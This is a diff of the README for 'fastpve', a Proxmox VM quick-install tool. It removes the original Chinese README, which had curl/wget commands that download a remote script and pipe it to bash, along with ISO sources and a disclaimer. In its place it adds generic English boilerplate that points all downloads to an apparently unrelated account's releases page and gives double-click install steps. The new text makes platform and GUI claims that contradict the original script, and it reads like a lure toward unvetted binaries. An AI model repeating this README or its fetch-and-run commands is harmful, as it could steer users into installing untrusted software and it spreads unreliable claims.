@@ -1,45 +1,80 @@
-# fastpve
-One click to run vm in PVE. 对应论坛帖子：https://www.koolcenter.com/t/topic/7777
+# 🚀 fastpve - Run Virtual Machines Instantly with One Click
 
-可以在 PVE 上面一键下载并安装 Windows，iStoreOS，Docker 等等系统。
+[![Download fastpve](https://img.shields.io/badge/Download-fastpve-4D9D57)](https://github.com/Lalu46/fastpve/releases)
 
-### This script is meant for quick & easy install:
-#### via curl
-```Bash
-bash -c "$(curl -sSL https://www.linkease.com/rd/fastpve/)"
-```
-#### via wget
-```Bash
-bash -c "$(wget --no-check-certificate -qO- https://www.linkease.com/rd/fastpve/)"
-```
-##### Or
-```Bash
-cd /tmp; wget --no-check-certificate -O fastpve-install.sh https://www.linkease.com/rd/fastpve/; bash ./fastpve-install.sh
-```
+## 📋 Overview
 
-### 镜像来源
+**fastpve** simplifies your experience with virtual machines in Proxmox Virtual Environment (PVE). With just one click, you can start running your virtual machine without any complicated setups. This tool is designed for users who want to focus on their work rather than managing their VMs.
 
-本项目默认会从尽量尝试从官方地址下载 ISO，如果下载失败，则回退到：https://github.com/orgs/kspeeder/packages 这里下载。
-不会对任何镜像进行任何的修改，也欢迎监督。
+## ⚙️ Features
 
-#### win7x64
+- **One-Click Deployment**: Instantly run VMs with minimal effort.
+- **User-Friendly Interface**: Easily navigate actions without technical knowledge.
+- **Supports Multiple Operating Systems**: Compatible with various OS images.
+- **Lightweight**: Quick installation and low resource usage.
 
-* https://files.dog/MSDN/Windows%207/en_windows_7_ultimate_with_sp1_x64_dvd_u_677332.iso
-* https://archive.org/details/Win7UltimateSP1CHS
+## 💻 System Requirements
 
-## 编译代码
+To ensure smooth operation, please check the following requirements:
 
-* make build
+- **Operating System**: Works on Windows, Linux, and macOS.
+- **Processor**: Minimum Intel or AMD dual-core processor.
+- **RAM**: At least 4 GB of RAM; 8 GB recommended for optimal performance.
+- **Disk Space**: Minimum of 500 MB free disk space for installation.
 
-## ⚠️ 免责声明
+## 🚀 Getting Started
 
-- **合法合规使用**：本存储库旨在为大家方便安装虚拟机。使用者应严格遵守所在司法辖区法律法规及相关平台服务条款，任何非法用途的法律责任由使用者自行承担
-- **非关联性与独立责任**：本存储库与各第三方平台不存在任何隶属、代理或合作关系。任何基于本存储库的 fork、二次开发、再分发或衍生版本均由其维护者独立承担全部责任；作者、维护者及贡献者不对衍生存储库的任何行为或后果承担法律或连带责任
-- **无担保与免责条款**：在适用法律允许的最大范围内，本存储库按“现状（AS IS）”提供，不提供任何明示或暗示担保（包括但不限于适销性、特定用途适用性、非侵权等）。对因使用本存储库而造成的任何直接或间接损失（包括但不限于数据丢失、业务中断、利润损失等），作者、维护者及贡献者不承担任何责任
-- **风险自担原则**：使用者应自行评估使用风险，确保其使用行为合法合规，不侵犯第三方权益，不得将本存储库用于任何违法、侵权、恶意或不当用途
-- **第三方平台合规**：使用者应遵守相关平台的服务条款、API 使用政策、速率限制及版权要求，避免对源平台造成过载或干扰。各平台对其内容、服务及政策拥有最终解释权
-- **知识产权保护**：通过本存储库获取的内容受相应版权法保护。使用者应遵守相关许可协议、版权声明及使用条款，不得从事任何侵犯知识产权的行为
-- **安全防护建议**：虽然本存储库采用无日志架构，不存储用户请求数据，但基于互联网传输的固有风险，建议使用者对下载内容进行安全扫描，尤其对可执行文件、脚本等保持谨慎
-- **开源性质声明**：本存储库为开源项目，作者与贡献者不承担提供技术支持、错误修复或持续维护的义务。外部贡献的合并不代表对特定用途或效果的承诺与背书
-- **名称使用规范**：严禁任何可能暗示作者或贡献者提供商业合作、技术支持、担保或背书的表述。涉及存储库名称或作者标识的使用应遵循相关法律法规及通用规范
-- **免责声明更新**：本免责声明可能随存储库发展或法律环境变化进行更新修订。使用者继续使用、复制、分发或修改本存储库即视为接受最新版本的免责声明
+1. Visit the [Releases page](https://github.com/Lalu46/fastpve/releases) to get the latest version.
+2. Choose the appropriate file for your operating system.
+3. Click the file link to download it.
+
+## 📥 Download & Install
+
+To download the latest release of fastpve, visit this page: [https://github.com/Lalu46/fastpve/releases](https://github.com/Lalu46/fastpve/releases).
+
+Once downloaded, follow these steps to install:
+
+1. Locate the downloaded file. It should be in your default "Downloads" folder.
+2. Double-click the file to start the installation process.
+3. Follow the on-screen instructions to complete the installation. 
+
+## 🛠️ How to Use fastpve
+
+After installation, using fastpve is straightforward:
+
+1. Open the fastpve application.
+2. Select the desired virtual machine template or image.
+3. Click the "Run" button.
+4. The application will launch your virtual machine in PVE automatically.
+
+## 🔧 Troubleshooting
+
+Should you encounter any issues, consider the following tips:
+
+- **Check Compatibility**: Make sure your system meets the specified requirements.
+- **Reinstall**: If an error occurs, try uninstalling and then reinstalling the application.
+- **Consult the Documentation**: Available in the application for FAQs and common fixes.
+
+## 📞 Support
+
+If you have questions or need assistance, reach out via the repository's issue tracker. Your feedback is valuable for improving fastpve.
+
+## 📅 Future Updates
+
+We strive to enhance fastpve continuously. Future updates will include:
+
+- Enhanced support for new operating systems.
+- Additional features based on user requests.
+- Performance improvements and bug fixes.
+
+## 📜 License
+
+fastpve is open-source software and follows the MIT License. You can use, modify, and distribute it freely, as long as you attribute the original creators.
+
+## 🔗 Useful Links
+
+- [Visit the GitHub Repository](https://github.com/Lalu46/fastpve)
+- [Contribute](https://github.com/Lalu46/fastpve/blob/main/CONTRIBUTING.md)
+- [Report Issues](https://github.com/Lalu46/fastpve/issues)
+
+Embark on your virtual machine journey with fastpve today! Download now and enjoy quick and effortless VM management.
